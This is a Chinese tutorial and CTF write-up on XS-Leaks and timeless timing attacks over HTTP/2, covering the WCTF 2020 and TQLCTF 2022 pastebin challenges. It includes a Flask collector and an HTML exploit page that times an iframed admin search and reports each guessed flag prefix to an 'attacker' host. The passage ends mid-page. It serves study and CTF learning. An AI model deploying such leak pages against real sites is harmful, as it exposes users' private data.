@@ -1,0 +1,332 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<p>@<a href="文章目录" target="_blank">TOC</a></p>
+<h2 data-content="1" id="0e20f5162c8cc85d22d75f5b1893bbd3">1 XS-Leaks简介</h2>
+<h3 data-content="1" id="2f9168b2e1b2a9c0f647215e1d7d93a5">1 什么是XS-Leaks？</h3>
+<p>Cross-site leaks（又名 XS-Leaks、XSLeaks）是一类源自 Web 平台内置的侧通道的漏洞。他们利用网络的可组合性核心原则，允许网站相互交互，并滥用合法机制来推断有关用户的信息。</p>
+<h3 data-content="1" id="77644899b7ceeaaaca532e26cfaa4617">2 XS-Leaks和CSRF的区别</h3>
+<p>XS-Leaks 和 csrf 较为相似。不过主要区别是 csrf 是用来让受害者执行某些操作，而xs-leaks 是用来探测用户敏感信息。</p>
+<h3 data-content="1" id="226e8f51c9f51ebb1444816e41f8be09">3 XS-Leaks的利用原理和使用条件</h3>
+<p>浏览器提供了多种功能来支持不同 Web 应用程序之间的交互；例如，它们允许网站加载子资源、导航或向另一个应用程序发送消息。虽然此类行为通常受到 Web 平台中内置的安全机制（例如同源策略）的限制，但 XS-Leaks 会利用网站之间交互过程中暴露的小块信息。</p>
+<p>XS-Leak 的原理是使用 Web 上可用的侧信道来探测有关用户的敏感信息，例如他们在其他 Web 应用程序中的数据、有关其本地环境的详细信息或他们连接到的内部网络。</p>
+<p>设想网站存在一个模糊查找功能（若前缀匹配则返回对应结果）例如 <code>http://localhost/search?query=</code>，页面是存在 xss 漏洞，并且有一个类似 flag 的字符串，并且只有不同用户查询的结果集不同。这时你可能会尝试 csrf，但是由于网站正确配置了 CORS，导致无法通过 xss 结合 csrf 获取到具体的响应。这个时候就可以尝试 XS-Leaks。虽然无法获取响应的内容，但是是否查找成功可以通过一些侧信道来判断。</p>
+<p><strong>这些侧信道的来源通常有以下几类：</strong></p>
+<ol>
+<li>浏览器的 api (e.g. <a href="https://xsleaks.dev/docs/attacks/frame-counting/" target="_blank">Frame Counting</a> and <a href="https://xsleaks.dev/docs/attacks/timing-attacks/" target="_blank">Timing Attacks</a>)</li>
+<li>浏览器的实现细节和 bugs (e.g. <a href="https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/" target="_blank">Connection Pooling</a> and <a href="https://xsleaks.dev/docs/attacks/historical/content-type/#typemustmatch" target="_blank">typeMustMatch</a>)</li>
+<li>硬件 bugs (e.g. Speculative Execution Attacks <a href="https://xsleaks.dev/#fn:4" target="_blank">4</a>)</li>
+</ol>
+<p>一般来说，想要成功利用，需要网页具有模糊查找功能，可以构成二元结果（成功或失败），并且二元之间的差异性可以通过某种侧信道技术探测到。</p>
+<p>补充一下，侧信道(Side Channel Attck)攻击主要是通过利用非预期的信息泄露来间接窃取信息。</p>
+<h2 data-content="1" id="8b48a8ef58b1583dfb44ae3ddc4d624a">2 网络计时攻击-network timing</h2>
+<h3 data-content="1" id="cf907eb62e5a056bc0afef725cbb5378">1 传统的计时攻击</h3>
+<p>想象这样一个情景，受害者有权限访问一些报告，当受害者访问我们的网站，我们发出两个请求：</p>
+<ul>
+<li>查询一个不可能存在的字符</li>
+<li>查询一个需要确认是否存在的字符</li>
+</ul>
+<p><img src="https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220429230250319.png"/></p>
+<p>当发现查询的时间有差异时，我们就能推断出这个字符存在于报告中的某个地方；同理，当两个请求返回的时间相同，说明该字符不在。</p>
+<p>但现实环境并没有那么理想，根据29th usenix 上的这篇论文<a href="https://www.usenix.org/system/files/sec20-van_goethem.pdf" target="_blank">Timeless Timing Attacks: Exploiting Concurrency to Leak Secrets over Remote Connections</a>，传统的基于时间的攻击主要受到以下一些因素影响：</p>
+<ul>
+<li>基于攻击者与服务器间的网络因素<ul>
+<li>高的网络延迟会带来比较差的攻击效果。（尽管攻击者可以使用离目标服务器物理位置比较近的 VPS 或者同一个 VPS 供应商来解决这个问题）</li>
+</ul>
+</li>
+<li>网络延迟在上游下游都有可能产生</li>
+<li>时间差是决定传统时间攻击是否能够成功的重要因素<ul>
+<li>例如监测 50 ms 就要比 5µs 要简单</li>
+</ul>
+</li>
+<li>需要大量的测试请求</li>
+</ul>
+<p>一般来说判断延迟所需要的请求数量：</p>
+<p><img src="https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220429231303945.png" style=""/></p>
+<p>也就是说在这种情况下，我们可能需要发送成百上千的请求才能判断是否存在信息泄露，并且它仅仅只能判断一个字符。这不仅需要发送大量请求，而且在整个攻击过程中受害者需要持续访问我们的的网站以及一些其他的限制。</p>
+<h3 data-content="1" id="48a432cb92d24641a23c368444f51f89">2 Timeless timing</h3>
+<h4 data-content="1" id="829bdaea477e1cab54c7d97813963fb3">1 原理</h4>
+<p><img src="https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/HOdLtI.png"/></p>
+<p>在整个攻击流程中，我们想要知道的是查询所需要的时间，这个过程发生在服务端。而我们测量的地方在客户端，这中间会发生许多的网络交换，这个过程无法避免，因为我们不能直接在服务器上测量时间。</p>
+<p>事实上，我们在意的并不是两个查询各自花费了多少时间，我们在意的是哪一个花费的时间更长！</p>
+<p>这里我们假设有两个报文 A 、 B，后端服务器在接受到 A 时会产生延迟，接受到 B 时不会产生延迟，这篇论文主要通过以下方式解决了传统时间攻击的这些问题：</p>
+<ul>
+<li>
+<p>通过报文同时发出来尽可能使其同时到达来避免通信过程中产生的网络抖动影响(由于攻击者不能控制低层的网络协议，所以我们需要其他方法来让两个请求在同一个packet内)</p>
+<ul>
+<li>
+<p>这里可以有两个选择：多路复用以及报文封装</p>
+<ul>
+<li>
+<p>多路复用：可以通过 HTTP/2 并发流机制来达到这一个目的，使其尽可能在同一时间被发送并尽可能在同一时间到达。（比如 HTTP/2 与 HTTP/3 开启了多路复用，HTTP/1.1 并没有）其中尽量还要满足一个报文可以携带多个请求到达服务器这么一个条件</p>
+</li>
+<li>
+<p>报文封装：这种网络协议可以封装多个数据流（例如 HTTP/1.1 over Tor or VPN）</p>
+<p><img src="https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/HOuKJA.png"/></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>通过测量两个报文的返回顺序来代替传统攻击中测量报文所需时间</p>
+<ul>
+<li>对比 AB 两个报文哪一个先返回来判定哪一个受到了延迟，而不是通过测量哪一个报文用了多少时间</li>
+<li>此时要求服务器、应用拥有并行处理的能力，目前大多数都可以满足这个要求</li>
+</ul>
+</li>
+</ul>
+<p>如果我们可以满足同时发出两个报文 AB 并且他们也同时到达，Timeless Timing  攻击需要做的就是重复多组发送报文的操作，并统计他们返回的先后顺序，如果服务器处理两个报文后没有产生延迟的现象，那么这两个报文会被立即返回，因为返回顺序不受我们控制，并且可能受到<strong>返程</strong>通信过程中的网络影响，所以返回的先后顺序概率为 50% 及 50% 。</p>
+<p>如果服务器在处理 B 报文时会差生延迟现象，诸如比 A 要多进行一遍解密、查询等耗时的操作，那么 B 会比 A  要稍晚才能返回，这样一来，尽管响应报文在通信过程中仍然会受到一些影响，但是我们可以多次测量来统计这个概率，此时 B 比 A  先返回的概率回明显小于 50% ，于是我们可以通过这个概率来判断两个请求是否在服务器处理时产生了延迟。</p>
+<p>并且论文当中也对比了传统时间攻击与 Timeless Timing 攻击之间的各自区分一定时间延迟所需要的请求：<img src="https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220430000059163.png"/></p>
+<p>还是可以很明显的看出timeless timing在同样探测精度下所需要的请求数量要少很多。</p>
+<h4 data-content="1" id="ad5a4b6c21bb3d9b635074faaeb3925f">2 优点</h4>
+<ul>
+<li>
+<p>基于并发的Timeless timing attck不受网络抖动和不确定延迟的影响</p>
+</li>
+<li>
+<p>远程的计时攻击具有与本地系统上的攻击者相当的性能。</p>
+</li>
+</ul>
+<h2 data-content="1" id="cd28b7bd9b3813b241940a799606e7ed">4 题目讲解</h2>
+<h3 data-content="1" id="e3828ed8fb584b2d569db8eaadca455f">简单示例</h3>
+<p>在此之前我们可以先看一个demo</p>
+<p>a starting point for our exploit: <a href="https://github.com/DistriNet/timeless-timing-attacks" target="_blank">https://github.com/DistriNet/timeless-timing-attacks</a></p>
+<p>我们可以使用仓库中给的示例代码：</p>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">h2time</span> <span class="kn">import</span> <span class="n">H2Time</span><span class="p">,</span> <span class="n">H2Request</span>
+<span class="kn">import</span> <span class="nn">logging</span>
+<span class="kn">import</span> <span class="nn">asyncio</span>
+
+<span class="n">ua</span> <span class="o">=</span> <span class="s1">'h2time/0.1'</span>
+
+<span class="n">logging</span><span class="o">.</span><span class="n">basicConfig</span><span class="p">(</span><span class="n">level</span><span class="o">=</span><span class="n">logging</span><span class="o">.</span><span class="n">INFO</span><span class="p">)</span>
+<span class="n">logger</span> <span class="o">=</span> <span class="n">logging</span><span class="o">.</span><span class="n">getLogger</span><span class="p">(</span><span class="s1">'h2time'</span><span class="p">)</span>
+
+<span class="n">async</span> <span class="k">def</span> <span class="nf">run_two_gets</span><span class="p">():</span>
+    <span class="n">r1</span> <span class="o">=</span> <span class="n">H2Request</span><span class="p">(</span><span class="s1">'GET'</span><span class="p">,</span> <span class="s1">'https://tom.vg/?1'</span><span class="p">,</span> <span class="p">{</span><span class="s1">'user-agent'</span><span class="p">:</span> <span class="n">ua</span><span class="p">})</span>
+    <span class="n">r2</span> <span class="o">=</span> <span class="n">H2Request</span><span class="p">(</span><span class="s1">'GET'</span><span class="p">,</span> <span class="s1">'https://tom.vg/?2'</span><span class="p">,</span> <span class="p">{</span><span class="s1">'user-agent'</span><span class="p">:</span> <span class="n">ua</span><span class="p">})</span>
+    <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">'Starting h2time with 2 GET requests'</span><span class="p">)</span>
+    <span class="n">async</span> <span class="k">with</span> <span class="n">H2Time</span><span class="p">(</span><span class="n">r1</span><span class="p">,</span> <span class="n">r2</span><span class="p">,</span> <span class="n">num_request_pairs</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span> <span class="k">as</span> <span class="n">h2t</span><span class="p">:</span>
+        <span class="n">results</span> <span class="o">=</span> <span class="n">await</span> <span class="n">h2t</span><span class="o">.</span><span class="n">run_attack</span><span class="p">()</span>
+        <span class="k">print</span><span class="p">(</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="s1">','</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">str</span><span class="p">,</span> <span class="n">x</span><span class="p">)),</span> <span class="n">results</span><span class="p">)))</span>
+    <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">'h2time with 2 GET requests finished'</span><span class="p">)</span>
+
+<span class="n">loop</span> <span class="o">=</span> <span class="n">asyncio</span><span class="o">.</span><span class="n">get_event_loop</span><span class="p">()</span>
+<span class="n">loop</span><span class="o">.</span><span class="n">run_until_complete</span><span class="p">(</span><span class="n">run_two_gets</span><span class="p">())</span>
+
+<span class="n">loop</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</pre></div>
+<p>首先创建两个 H2Request 对象，然后将它们传递给 H2Time。当调用 run_attack() 方法时，客户端将开始发送请求对，并尝试确保两者同时到达服务器（每个请求的最终字节应放在单个 TCP 数据包中）。在第一个请求中，附加参数被添加到 URL 以抵消请求可以开始处理的时间差异（数字由 num_padding_params 参数定义 - 默认值：40）。</p>
+<p>H2Time 可以在顺序模式下运行，它等待发送下一个请求对，直到收到前一个请求对的响应。当顺序设置为 False 时，所有请求对将一次发送，间隔为 inter_request_time_ms 参数定义的毫秒数。</p>
+<p>返回的结果是一个包含 3 个元素的元组列表：</p>
+<ul>
+<li>
+<p>第二个请求和第一个请求之间的响应时间差异（以纳秒为单位）</p>
+</li>
+<li>
+<p>第一个请求的响应状态</p>
+</li>
+<li>
+<p>响应第二个请求的状态</p>
+</li>
+</ul>
+<p>如果响应时间的差异为负，这意味着首先收到了对第二个请求的响应。要执行 timeless 定时攻击，只需要考虑结果是肯定的还是否定的（肯定表示第一个请求的处理时间比处理第二个请求花费的时间少）。</p>
+<p><img src="https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220430010228239.png"/></p>
+<h3 data-content="1" id="ec10c7bbecac793f5634beaa920dec7f">[WCTF 2020]Spaceless Spacing</h3>
+<p>该题目主要考察的是我们可以构造并同时发出 HTTP/2 报文，从而使得尽量满足同时发出同时到达的条件。由于两个请求同时运行而没有网络差异来影响我们的计时，我们可以简单地检查哪个响应首先返回。</p>
+<h4 data-content="1" id="406055534af056d55b650d44da101c05">HTTP/2的多路复用</h4>
+<p>一般来说有http在传输时候有几种情况：</p>
+<table>
+<thead>
+<tr>
+<th style="">协议版本</th>
+<th style="">传输方式</th>
+<th style="">效果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">http1.0</td>
+<td style="">原始方式</td>
+<td style="">一个tcp只有一个请求和响应</td>
+</tr>
+<tr>
+<td style="">http1.1</td>
+<td style="">基础的keepalive</td>
+<td style="">复用同一个tcp，多个请求时，一个请求一个响应顺序执行</td>
+</tr>
+<tr>
+<td style="">http1.1</td>
+<td style="">pipeline模式</td>
+<td style="">复用一个tcp，多个请求时，同时发送多个请求，服务端顺序响应这几个请求，按照先进先出的原则强制响应顺序</td>
+</tr>
+<tr>
+<td style="">http2.0</td>
+<td style="">Multiplexing</td>
+<td style="">复用一个tcp，采用http2.0的封装，多个请求时，多个h2的帧，请求会并发进行处理，响应是乱序返回的（客户端根据帧信息自己会重组）</td>
+</tr>
+</tbody>
+</table>
+<p>由于 HTTP 1.X 是基于文本的，因为是文本，就导致了它必须是个整体，在传输是不可切割的，只能整体去传。<br/>
+ 但 HTTP 2.0 是基于二进制流的。有两个非常重要的概念，分别是帧（frame）和流（stream）</p>
+<ul>
+<li>帧代表着最小的数据单位，每个帧会标识出该帧属于哪个流。</li>
+<li>流就是多个帧组成的数据流。</li>
+</ul>
+<p><img src="https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220430003347104.png"/></p>
+<p>将 HTTP 消息分解为独立的帧，交错发送，然后在另一端重新组装。</p>
+<ul>
+<li>并行交错地发送多个请求，请求之间互不影响。</li>
+<li>并行交错地发送多个响应，响应之间互不干扰。</li>
+<li>使用一个连接并行发送多个请求和响应。</li>
+</ul>
+<p><img src="https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220430003413290.png"/></p>
+<p>简单的来说： 在同一个TCP连接中，同一时刻可以发送多个请求和响应，且不用按照顺序一一对应。</p>
+<p>之前是同一个连接只能用一次， 如果开启了keep-alive，虽然可以用多次，但是同一时刻只能有一个HTTP请求。</p>
+<p>有兴趣的可以看看题目环境<a href="[GitHub - ConnorNelson/spaceless-spacing: CTF Challenge](https://github.com/ConnorNelson/spaceless-spacing" target="_blank"></a><a href="https://github.com/ConnorNelson/spaceless-spacing" target="_blank">GitHub - ConnorNelson/spaceless-spacing: CTF Challenge</a>  )</p>
+<h3 data-content="1" id="d10e5782447fb01f943909f3b3595e6d">[TQLCTF 2022] A More Secure Pastebin</h3>
+<p>题目考点：</p>
+<ul>
+<li>XS-Leaks</li>
+<li>Timeless Timing</li>
+<li>HTTP/2 Concurrent Stream</li>
+<li>TCP Congestion Control</li>
+</ul>
+<p>理论基础：HTTP/2 并发流可以在一个流内组装多个 HTTP 报文；TCP Nagle 拥塞控制算法；在 TCP 产生拥堵时，浏览器会将多个报文放入到一个 TCP 报文当中。</p>
+<p>实践题解：Post 一个 body 过大的报文让 TCP 产生拥堵，使得浏览器将多个 HTTP/2 报文放在一个 TCP 报文当中，通过 admin 搜索 flag 产生时间差异，使用 Timeless Timing 攻击完成 XS-Leaks 。</p>
+<h4 data-content="1" id="ec68eaf5fdb0683e598cfaf3ef3ac077">题目</h4>
+<p>题目主要有两个对象：</p>
+<ul>
+<li>User 对象：拥有 username/password/webstie/date 属性</li>
+<li>Paste 对象：拥有 pastedid/username/title/content/date 属性</li>
+</ul>
+<p>题目主要功能：</p>
+<ul>
+<li>基础的用户注册登录功能</li>
+<li>用户可以自行创建 Paste ；用户可以自定义自己的 website 属性</li>
+<li>搜索功能：通过模糊匹配实现，但是用户传入的数据会被 escape-string-regexp 过滤。用户可以执行搜索自己的文章内容；Admin 用户则可以搜索所有用户的文章内容。</li>
+</ul>
+<p>其中 admin 用户的搜索功能实现为：</p>
+<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">searchRgx</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">RegExp</span><span class="p">(</span><span class="nx">escapeStringRegexp</span><span class="p">(</span><span class="nx">word</span><span class="p">),</span> <span class="s2">"gi"</span><span class="p">);</span>
+<span class="c1">// No time to implemente the pagination. So only show 5 results first.</span>
+<span class="kd">let</span> <span class="nx">paste</span> <span class="o">=</span> <span class="nx">await</span> <span class="nx">Pastes</span><span class="p">.</span><span class="nx">find</span><span class="p">({</span>
+    <span class="nx">content</span><span class="o">:</span> <span class="nx">searchRgx</span><span class="p">,</span>
+<span class="p">})</span>
+    <span class="p">.</span><span class="nx">sort</span><span class="p">({</span> <span class="nx">date</span><span class="o">:</span> <span class="s2">"asc"</span> <span class="p">})</span>
+    <span class="p">.</span><span class="nx">limit</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="nx">paste</span> <span class="o">&amp;&amp;</span> <span class="nx">paste</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">let</span> <span class="nx">data</span> <span class="o">=</span> <span class="p">[];</span>
+    <span class="nx">await</span> <span class="nb">Promise</span><span class="p">.</span><span class="nx">all</span><span class="p">(</span>
+        <span class="nx">paste</span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="nx">async</span> <span class="p">(</span><span class="nx">p</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+            <span class="kd">let</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">await</span> <span class="nx">User</span><span class="p">.</span><span class="nx">findOne</span><span class="p">({</span> <span class="nx">username</span><span class="o">:</span> <span class="nx">p</span><span class="p">.</span><span class="nx">username</span> <span class="p">});</span>
+            <span class="nx">data</span><span class="p">.</span><span class="nx">push</span><span class="p">({</span>
+                <span class="nx">pasteid</span><span class="o">:</span> <span class="nx">p</span><span class="p">.</span><span class="nx">pasteid</span><span class="p">,</span>
+                <span class="nx">title</span><span class="o">:</span> <span class="nx">p</span><span class="p">.</span><span class="nx">title</span><span class="p">,</span>
+                <span class="nx">content</span><span class="o">:</span> <span class="nx">p</span><span class="p">.</span><span class="nx">content</span><span class="p">,</span>
+                <span class="nx">date</span><span class="o">:</span> <span class="nx">p</span><span class="p">.</span><span class="nx">date</span><span class="p">,</span>
+                <span class="nx">username</span><span class="o">:</span> <span class="nx">user</span><span class="p">.</span><span class="nx">username</span><span class="p">,</span>
+                <span class="nx">website</span><span class="o">:</span> <span class="nx">user</span><span class="p">.</span><span class="nx">website</span><span class="p">,</span>
+            <span class="p">});</span>
+        <span class="p">})</span>
+    <span class="p">);</span>
+    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span> <span class="nx">status</span><span class="o">:</span> <span class="s2">"success"</span><span class="p">,</span> <span class="nx">data</span><span class="o">:</span> <span class="nx">data</span> <span class="p">});</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span> <span class="nx">status</span><span class="o">:</span> <span class="s2">"fail"</span><span class="p">,</span> <span class="nx">data</span><span class="o">:</span> <span class="p">[]</span> <span class="p">});</span>
+<span class="p">}</span>
+</pre></div>
+<p>也就是说 admin 用户搜索到对应的文章内容后，还会进一步找到对应的用户信息。</p>
+<p>可以看到 admin 的搜索接口其实就比较符合这个背景。因为 admin 搜索接口在搜索到相关内容时，会进一步去查询 MongoDB  当中的用户信息，如果搜不到就会立马返回响应，这里就是 Timeless Timing 所需要测量的时间差值。并且我们知道 flag 就在  admin 的文章当中，所以我们只需要让 admin 查自己的文章是否包含我们查询的字符串，比如 <code>flag{a</code> 就能通过是否有时间延迟来测量出来了。</p>
+<p>但是此时我们所处的背景环境是在浏览器当中，我们无法直接控制到报文的生成发送，这是进行 Timeless Timing  比较困难的地方。没办法控制报文同时发送就会让发出去的请求会因为各种网络抖动因素导致时间侧信道失效，所以怎么在浏览器的背景下利用 Timeless Timing 成了我们这个题目的最大的难点。</p>
+<p>这里我们需要用到 TCP 拥塞控制，其实应该指的是 <a href="https://baike.baidu.com/item/Nagle算法/5645172" target="_blank">Nagle 算法</a> :</p>
+<blockquote>
+<p>Nagle算法于1984年定义为福特航空和通信公司IP/<a href="https://baike.baidu.com/item/TCP拥塞控制/22718027" target="_blank">TCP拥塞控制</a>方法，这是福特经营的最早的专用<a href="https://baike.baidu.com/item/TCP%2FIP/214077" target="_blank">TCP/IP</a>网络减少拥塞<a href="https://baike.baidu.com/item/控制/10102496" target="_blank">控制</a>，从那以后这一方法得到了广泛应用。Nagle的文档里定义了处理他所谓的小包问题的方法，这种问题指的是应用程序一次产生一字节数据，这样会导致网络由于太多的包而过载（一个常见的情况是发送端的"<strong>糊涂窗口综合症(Silly Window Syndrome)</strong>"）。从<a href="https://baike.baidu.com/item/键盘/208749" target="_blank">键盘</a>输入的一个字符，占用一个字节，可能在传输上造成41字节的包，其中包括1字节的有用信息和40字节的首部数据。这种情况转变成了4000%的消耗，这样的情况对于轻负载的网络来说还是可以接受的，但是重负载的福特网络就受不了了，它没有必要在经过节点和网关的时候重发，导致包丢失和妨碍传输速度。吞吐量可能会妨碍甚至在一定程度上会导致连接失败。Nagle的算法通常会在TCP程序里添加两行代码，在未确认数据发送的时候让发送器把数据送到<a href="https://baike.baidu.com/item/缓存/100710" target="_blank">缓存</a>里。任何数据随后继续直到得到明显的数据确认或者直到攒到了一定数量的数据了再发包。尽管Nagle的算法解决的问题只是局限于福特网络，然而同样的问题也可能出现在ARPANet。这种方法在包括因特网在内的整个网络里得到了推广，成为了默认的执行方式，尽管在高互动环境下有些时候是不必要的，例如在客户/服务器情形下。在这种情况下，nagling可以通过使用TCP_NODELAY <a href="https://baike.baidu.com/item/套接字/9637606" target="_blank">套接字</a>选项<a href="https://baike.baidu.com/item/关闭/2901526" target="_blank">关闭</a>。</p>
+</blockquote>
+<p>简单来说，在 TCP 拥堵的情况下，数据报文会被暂时放到缓存区里，然后等后续数据到了一定程度才会被发送出去。按照这个理论，只要我们能够把 TCP 阻塞到一定程度即可让我们的报文放到缓存区中从而使得我们的两个搜索请求放到一个 TCP 报文当中了。</p>
+<p>如何让 TCP 产生拥堵呢？在浏览器里我们能进行的操作并不多，最简单最直接的就是直接发送 POST 一个过大 body 的 HTTP 请求即可。</p>
+<p>所以，到这里我们基本可以知道怎么去解题了。只需要提交一个页面链接，该页面会进行使用 JavaScript 进行以下操作：</p>
+<ol>
+<li>Post 过大的 body 到任意接受 POST 的路由进而阻塞整个 TCP 信道</li>
+<li>使用两个<code>fetch</code>向搜索接口发送我们需要探测的字符串，此时系统检测到 TCP 信道存在阻塞，会将这两个请求放入到缓冲区，从而放入到一个 TCP 报文当中</li>
+<li>使用<code>Promise.all</code>或者其他方法检测这两个 fetch 哪一个先被返回</li>
+<li>重复以上步骤，每对字符串请求以 10 次或 20 次为一轮，统计每轮请求中对应字符的返回顺序优先关系得到概率，进行多轮（最好大于等于 4 轮）探测</li>
+<li>根据我们得到的结果频率为依据判断我们探测的字符</li>
+</ol>
+<h4 data-content="1" id="2f909dde58b56a9b4ce3f4190828b0fd">解题</h4>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span><span class="n">render_template</span><span class="p">,</span><span class="n">request</span><span class="p">,</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+    <span class="n">word</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'word'</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'index.html'</span><span class="p">,</span><span class="n">word</span><span class="o">=</span><span class="s2">"TQLCTF{</span><span class="si">%s</span><span class="s2">"</span><span class="o">%</span><span class="n">word</span><span class="p">)</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/result'</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">check</span><span class="p">():</span>
+    <span class="n">word</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'word'</span><span class="p">)</span>
+    <span class="n">ms</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'ms'</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s1">'</span><span class="si">%s</span><span class="s1">,</span><span class="si">%s</span><span class="s1">'</span><span class="o">%</span><span class="p">(</span><span class="n">word</span><span class="p">,</span><span class="n">ms</span><span class="p">))</span>
+    <span class="k">return</span> <span class="s2">"asd"</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
+    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">"0.0.0.0"</span><span class="p">,</span><span class="n">port</span><span class="o">=</span><span class="mi">5001</span><span class="p">)</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="c">&lt;!-- templates/index.html--&gt;</span>
+<span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">"en"</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">"UTF-8"</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">"X-UA-Compatible"</span> <span class="na">content</span><span class="o">=</span><span class="s">"IE=edge"</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">"viewport"</span> <span class="na">content</span><span class="o">=</span><span class="s">"width=device-width, initial-scale=1.0"</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Document<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+    <span class="c">&lt;!--头部--&gt;</span>
+    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+        <span class="kr">const</span> <span class="nx">start</span> <span class="o">=</span> <span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span> <span class="c1">//这里开始计时</span>
+    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+                <span class="c1">//abc()会将加载时间计算好之后，连同测试字符一同发给result路由。</span>
+        <span class="nx">abc</span> <span class="o">=</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+            <span class="kr">const</span> <span class="nx">end</span> <span class="o">=</span> <span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span>  
+            <span class="kd">var</span> <span class="nx">req</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+            <span class="nx">req</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">'get'</span><span class="p">,</span><span class="sb">`http://attacker/result?word={{word}}&amp;ms=</span><span class="si">${</span><span class="nx">end</span> <span class="o">-</span> <span class="nx">start</span><span class="si">}</span><span class="sb">`</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>
+            <span class="nx">req</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+            <span class="nx">req</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="c">&lt;!--底部--&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+        <span class="c">&lt;!--因为跨域的原因，所以选择用iframe加载搜索接口，加载完成后执行onload事件，即abc()。--&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">"https://proxy:443/admin/searchword?word={{word}}"</span> <span class="na">onload</span><span class="o">=</span><span class="s">"abc()"</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
